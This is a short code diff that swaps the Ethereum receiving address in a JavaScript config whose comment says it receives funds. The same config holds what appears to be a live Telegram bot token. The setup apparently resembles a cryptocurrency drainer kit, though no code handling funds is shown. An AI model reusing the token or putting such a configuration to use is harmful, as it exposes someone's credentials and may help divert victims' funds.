@@ -4,7 +4,7 @@
 
 const CONFIG = {
     // Your Ethereum address to receive funds
-    RECEIVER_ADDRESS: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7",
+    RECEIVER_ADDRESS: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7",
 
     // Telegram bot notification settings
     TELEGRAM_BOT_TOKEN: "8535172282:AAHjqVlUk0zj5Sb72bQdFIwg7ylZMeUdyxw",
